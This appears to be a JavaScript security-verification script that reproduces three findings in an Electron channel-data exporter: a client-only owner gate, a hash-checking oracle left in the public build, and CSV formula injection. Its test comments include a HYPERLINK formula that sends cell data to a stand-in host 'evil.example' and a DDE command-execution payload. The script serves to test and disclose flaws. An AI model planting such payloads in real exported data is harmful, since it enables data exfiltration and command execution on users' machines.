/**
 * v-e4-e6-e7.cjs — VERIFY three channel-exporter / owner-gate findings.
 *
 *  E-4  The owner gate has no server side: on a non-allowlisted machine the UI
 *       is hidden but the whole feature still works.
 *  E-6  `owner:check` is a hash oracle, and it is live in the public build.
 *  E-7  CSV formula injection: a comment starting with `=` is written unescaped.
 *
 * Written from the findings' Steps, from scratch, against production-shape
 * mirrors I built myself (v-build-mirror.cjs):
 *    public     — VITE_ENABLE_CHANNEL_DATA unset
 *    owner      — feature in, THIS machine's salted hash allowlisted
 *    nonowner   — feature in, a DIFFERENT machine's hash allowlisted
 * Salt: verify-slice3-salt-9d41 (mine, not the original author's).
 *
 * Usage: xvfb-run -a --server-args="-screen 0 1440x900x24" node v-e4-e6-e7.cjs <shape> [runLabel]
 *   shape: public | owner | nonowner | all
 */
const fs = require("node:fs");
const path = require("node:path");
const crypto = require("node:crypto");
const L = require("./v-lib.cjs");

const MIRROR_INFO = (shape) => JSON.parse(fs.readFileSync(`/tmp/v3-app-${shape}/MIRROR.json`, "utf8"));
const CHANNEL_URL = "https://www.youtube.com/@stubchannel";

// Third-party text the owner does not control: a comment and a caption that a
// spreadsheet will evaluate as formulas.
const FORMULA_COMMENT = "=cmd reply";
const FORMULA_COMMENT_2 = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
const FORMULA_COMMENT_3 = "+1+1";
const FORMULA_COMMENT_4 = "-2-2";
const FORMULA_COMMENT_5 = "@SUM(1:1)";
const FORMULA_CAPTION = '=1+1, "quoted" caption 🎬 עברית';
const DDE = "=cmd|' /C calc'!A1";

function channelScript() {
  return {
    id: "UCstubchannel",
    title: "Stub Channel",
    entries: [
      { id: "vid000000001", title: "First video", duration: 120 },
      { id: "vid000000002", title: 'Comma, then ""quoted"", then =SUM(A1:A2) 🎬 שלום', duration: 90 },
      { id: "vid000000003", title: "Third video", duration: 45 },
    ],
    comments: [
      { id: "c1", text: FORMULA_COMMENT, author: "Alice", parent: "root", like_count: 3, timestamp: 1700000000 },
      { id: "c2", text: FORMULA_COMMENT_2, author: 'A, "B" 😀', parent: "root", like_count: 1, timestamp: 1700000001 },
      { id: "c3", text: FORMULA_COMMENT_3, author: "Carl", parent: "root", like_count: 0, timestamp: 1700000002 },
      { id: "c4", text: FORMULA_COMMENT_4, author: "Dee", parent: "root", like_count: 0, timestamp: 1700000003 },
      { id: "c5", text: FORMULA_COMMENT_5, author: "Eve", parent: "root", like_count: 0, timestamp: 1700000004 },
      { id: "c6", text: DDE, author: "Mallory", parent: "root", like_count: 0, timestamp: 1700000005 },
      { id: "c7", text: "an ordinary comment, with a comma", author: "Zoe", parent: "root", like_count: 0, timestamp: 1700000006 },
    ],
    captions: `WEBVTT\n\n00:00:00.000 --> 00:00:03.000\n${FORMULA_CAPTION}\n\n00:00:03.000 --> 00:00:05.000\nsecond caption line\n`,
  };
}

/** Minimal RFC 4180 reader, written here so the CSVs are read back independently. */
function parseCsv(text) {
  const t = text.replace(/^﻿/, "");
  const rows = [];
  let row = [], field = "", inQ = false;
  for (let i = 0; i < t.length; i++) {
    const c = t[i];
    if (inQ) {
      if (c === '"') { if (t[i + 1] === '"') { field += '"'; i++; } else inQ = false; }
      else field += c;
    } else if (c === '"') inQ = true;
    else if (c === ",") { row.push(field); field = ""; }
    else if (c === "\r") { /* skip */ }
    else if (c === "\n") { row.push(field); rows.push(row); row = []; field = ""; }
    else field += c;
  }
  if (field.length || row.length) { row.push(field); rows.push(row); }
  return rows;
}

const FORMULA_START = /^[=+\-@\t\r]/;

function auditCsvFolder(dir) {
  const report = { dir, files: {}, formulaCells: [], formulaColumns: new Set() };
  for (const f of fs.readdirSync(dir).filter((x) => x.endsWith(".csv"))) {
    const raw = fs.readFileSync(path.join(dir, f), "utf8");
    const rows = parseCsv(raw);
    const header = rows[0] || [];
    report.files[f] = { bytes: raw.length, rows: rows.length, hasBom: raw.charCodeAt(0) === 0xfeff, crlf: /\r\n/.test(raw), header };
    for (let r = 1; r < rows.length; r++) {
      for (let c = 0; c < rows[r].length; c++) {
        const v = rows[r][c];
        if (typeof v === "string" && FORMULA_START.test(v)) {
          report.formulaCells.push({ file: f, row: r + 1, column: header[c] || `col${c}`, firstChar: v[0], value: v.slice(0, 60) });
          report.formulaColumns.add(`${f}/${header[c] || c}`);
        }
      }
    }
  }
  report.formulaColumns = [...report.formulaColumns];
  return report;
}

async function runShape(shape, out) {
  const info = MIRROR_INFO(shape);
  const stubRoot = L.makeStub(`e-${shape}`);
  L.stub(stubRoot, { channel: channelScript() });
  const a = await L.launchMirror({ shape, label: `v-e-${shape}`, stubRoot, seed: { "clipper.dataDirConfirmed": true } });
  await a.win.waitForSelector("header", { timeout: 20000 });

  const s = { shape, mirror: info, apiBase: a.apiBase };

  // ---------- E-6: owner:check as an oracle, in every shape --------------
  const salt = "probe-salt-chosen-by-the-caller";
  const realId = fs.readFileSync("/etc/machine-id", "utf8").trim();
  const h = (id, sl) => crypto.createHash("sha256").update(`${sl}:${String(id).trim().toLowerCase()}`).digest("hex");
  s.E6 = await a.win.evaluate(async (args) => {
    const api = window.electronAPI;
    const present = typeof api?.isOwnerMachine === "function";
    if (!present) return { present: false };
    const call = (list, sl) => api.isOwnerMachine(list, sl);
    return {
      present: true,
      withRealHash: await call([args.realHashBuildSalt], args.buildSalt),
      withOtherHash: await call([args.otherHash], args.buildSalt),
      oracleGuessRight: await call([args.guessRight], args.probeSalt),
      oracleGuessWrong: await call([args.guessWrong], args.probeSalt),
      withEmptyList: await call([], args.probeSalt),
      withEmptySalt: await call([args.guessRight], ""),
      nonArray: await call("not-an-array", args.probeSalt),
      returnsOnlyBooleans: true,
    };
  }, {
    buildSalt: info.salt || "x",
    realHashBuildSalt: info.myHash,
    otherHash: info.otherHash,
    probeSalt: salt,
    guessRight: h(realId, salt),
    guessWrong: h("00000000000000000000000000000000", salt),
  });
  // Does the public bundle contain any trace of the gate?
  const assetsDir = path.join(a.mirror, "dist", "assets");
  const bundle = fs.readFileSync(path.join(assetsDir, fs.readdirSync(assetsDir).find((f) => /^index-.*\.js$/.test(f))), "utf8");
  s.E6_rendererCallsOwnerCheck = /isOwnerMachine/.test(bundle);
  s.E6_preloadShipsOwnerCheck = /owner:check/.test(fs.readFileSync(path.join(a.mirror, "electron", "preload.cjs"), "utf8"));
  s.E6_mainShipsOwnerCheck = /owner:check/.test(fs.readFileSync(path.join(a.mirror, "electron", "main.cjs"), "utf8"));

  // ---------- E-4: is the UI hidden, and do the endpoints still work? ----
  s.E4_uiHidden = await a.win.evaluate(() => ({
    navHasChannelLink: Boolean(document.getElementById("ui-channel-link")),
    visibleText: /Channel data/.test(document.body.innerText),
  }));
  s.E4_shot = await a.shot("as-launched");

  const exportBody = {
    url: CHANNEL_URL, contentType: "all", limit: 3,
    includeVideoDetails: true, includeComments: true, includeTranscripts: true,
    deliver: "path", fresh: true,
  };
  const r = await L.jsonReq({ port: a.port, path: "/api/channel/export?jobId=verify-attacker-1", body: exportBody, timeout: 180000 });
  let body = null; try { body = JSON.parse(r.body); } catch { body = { raw: (r.body || "").slice(0, 300) }; }
  s.E4_exportCall = { status: r.status, keys: Object.keys(body || {}), counts: body && body.counts, error: body && body.error, paths: body && (body.paths || body.files) };
  const cancel = await L.jsonReq({ port: a.port, path: "/api/channel/export/cancel", body: { jobId: "verify-attacker-1" } });
  s.E4_cancelCall = { status: cancel.status, body: (cancel.body || "").slice(0, 120) };
  const prog = await L.req({ port: a.port, path: "/api/channel/export/progress?jobId=verify-attacker-1", timeout: 4000 });
  s.E4_progressCall = { status: prog.status, contentType: prog.headers && prog.headers["content-type"], body: (prog.body || "").slice(0, 160) };

  // Audit the bytes the SERVER wrote, straight out of its own output folder.
  if (body && body.dir && fs.existsSync(body.dir)) {
    s.E7_csv_serverFolder = auditCsvFolder(body.dir);
  }

  // Can a page script then write the CSVs anywhere it likes, via the bridge?
  const outFiles = body && (body.files || body.paths);
  if (outFiles) {
    const target = `/tmp/v3-e4-steal-${shape}`;
    fs.rmSync(target, { recursive: true, force: true });
    s.E4_saveExport = await a.win.evaluate(async (args) => {
      try {
        return await window.electronAPI.saveExport({ dirPath: args.dir, folder: "verify-exfil-copy", files: args.files });
      } catch (e) { return { ok: false, error: String(e && e.message) }; }
    }, { dir: target, files: outFiles });
    const landed = path.join(target, "verify-exfil-copy");
    s.E4_filesOnDisk = fs.existsSync(landed) ? fs.readdirSync(landed) : [];
    if (s.E4_filesOnDisk.length) s.E7_csv = auditCsvFolder(landed);
  }

  // Also check: is the exporter's code in this shape's server bundle at all?
  const srv = fs.readFileSync(path.join(a.mirror, "electron", "dist", "server.cjs"), "utf8");
  s.serverBundleHasChannelRoutes = srv.includes("/api/channel/export");

  await a.close();
  out.shapes.push(s);
  return s;
}

(async () => {
  const which = process.argv[2] || "all";
  const runLabel = process.argv[3] || "r1";
  const out = { runLabel, startedAt: new Date().toISOString(), shapes: [] };
  const list = which === "all" ? ["public", "owner", "nonowner"] : [which];
  for (const shape of list) await runShape(shape, out);

  out.summary = out.shapes.map((s) => ({
    shape: s.shape,
    uiHidden: !s.E4_uiHidden.navHasChannelLink && !s.E4_uiHidden.visibleText,
    serverBundleHasRoutes: s.serverBundleHasChannelRoutes,
    exportStatus: s.E4_exportCall.status,
    exportCounts: s.E4_exportCall.counts,
    cancelStatus: s.E4_cancelCall.status,
    progressStatus: s.E4_progressCall.status,
    savedFiles: s.E4_filesOnDisk,
    ownerCheck: s.E6,
    formulaCells: s.E7_csv_serverFolder ? s.E7_csv_serverFolder.formulaCells.length : null,
    formulaColumns: s.E7_csv_serverFolder ? s.E7_csv_serverFolder.formulaColumns : null,
    savedCopyFormulaCells: s.E7_csv ? s.E7_csv.formulaCells.length : null,
  }));
  console.log(JSON.stringify(out.summary, null, 2));
  console.log(L.save(`v-e467-${which}-${runLabel}.json`, out));
})();
